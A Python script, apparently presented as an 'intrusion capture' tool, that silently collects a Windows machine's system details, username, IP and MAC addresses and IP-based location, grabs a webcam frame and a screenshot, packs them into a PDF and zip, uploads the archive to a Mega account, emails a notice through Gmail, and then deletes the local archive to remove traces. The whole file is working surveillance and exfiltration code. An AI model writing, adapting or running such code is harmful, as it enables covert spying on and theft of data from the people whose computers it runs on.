import getpass
import os
import platform
import re
import shutil
import socket
import uuid
import smtplib
from datetime import datetime
from zipfile import ZipFile

import cv2
import geocoder
from mega import Mega
import psutil
import pyautogui
import reverse_geocoder as rg
from fpdf import FPDF
from requests import get


class IntrusionCapture(object):
    def __init__(self):
        file_path = os.path.join(r"C:\Users\Public")
        self.file_folder = os.path.join(file_path, "Data_files")
        try:
            os.mkdir(self.file_folder)
        except FileExistsError:
            pass
        self.save_path = os.path.join(
            os.path.join(r"C:\Users\Public"), "Data_files")
        self.os_data = platform.uname()
        self.boot_ts = datetime.fromtimestamp(psutil.boot_time())
        self.curr_ts = datetime.now()
        self.location = [*geocoder.ip("me").latlng]
        self.pdf_writer = FPDF()
        self.data = {}

    def system_info(self):
        self.data["Operating System"] = self.os_data.system
        self.data["Operating System Release"] = self.os_data.release
        self.data["Operating System Version"] = self.os_data.version
        self.data["Operating System Arch"] = self.os_data.machine
        self.data["Processor"] = self.os_data.processor
        self.data["Host Name"] = self.os_data.node
        self.data["Username"] = getpass.getuser()
        self.data["Boot Time"] = str(
            f"{self.boot_ts.day}/{self.boot_ts.month}/{self.boot_ts.year} {self.boot_ts.hour}:{self.boot_ts.minute}:{self.boot_ts.second}")
        self.data["Current Time"] = str(
            self.curr_ts.strftime("%d-%m-%Y %H:%M:%S"))
        self.data["Public IP Adress"] = get('http://api.ipify.org').text
        self.data["Local IP Address"] = socket.gethostbyname(
            socket.gethostname())
        self.data["Mac Address"] = ':'.join(
            re.findall('..', '%012x' % uuid.getnode()))

    def target_location(self):
        latitude, longitude = self.location
        city = rg.search((latitude, longitude), verbose=False)
        self.data["Location"] = city[0]["name"]

    def headshot(self):
        while True:
            try:
                camera = cv2.VideoCapture(0)
                val, frame = camera.read()
                cv2.imshow("Smile!", frame)
            except:
                pass
            finally:
                shot = pyautogui.screenshot()
                shot.save(f"{self.save_path}\\python_screenshot.png")
                img = cv2.imread(f"{self.save_path}\\python_screenshot.png")
                height, width, _ = img.shape
                self.data["Screen Size"] = str(f"{width}x{height} px")
                camera.release()
                cv2.destroyAllWindows()
                break

    def pdf_assemble(self):
        line = 0
        self.pdf_writer.add_page()
        self.pdf_writer.set_font("Arial", size=15)
        for key, value in self.data.items():
            key = key.encode('latin-1', 'replace').decode('latin-1')
            value = value.encode('latin-1', 'replace').decode('latin-1')
            self.pdf_writer.cell(
                200, 10, txt=f"{key}: {value}", ln=line, align="c")
            line += 1
        self.pdf_writer.output(os.path.join(self.save_path, "Datafile.pdf"))

    def zip_files(self):
        zip_file = ZipFile(f"{self.file_folder}.zip", "w")
        for root, dirs, files in os.walk(self.file_folder, topdown=False):
            for name in files:
                file = os.path.join(root, name)
                zip_file.write(file)
        zip_file.close()
        shutil.rmtree(self.file_folder)

    def upload(self):
        m = Mega()
        m.login('your_mega_mail','your_mega_pwd')
        m.upload(r"C:\Users\Public\Data_files.zip")
        ip = get('https://api.ipify.org').text
        se = 'sender@gmail.com'
        p = 'sender_pwd'
        r = 'receiver@example.com'
        t = f'The file has been uploaded with success from {ip}.'
        s = smtplib.SMTP_SSL("smtp.gmail.com",465)
        s.login(se, p)
        s.sendmail(se, r, t)
        s.quit()

    def deltraces(self):
        if os.path.isfile(r"C:\Users\Public\Data_files.zip"):
            os.remove(r"C:\Users\Public\Data_files.zip")
        else:
            pass

if __name__ == "__main__":
    snap = IntrusionCapture()
    snap.system_info()
    snap.target_location()
    snap.headshot()
    snap.pdf_assemble()
    snap.zip_files()
    snap.upload()
    snap.deltraces()
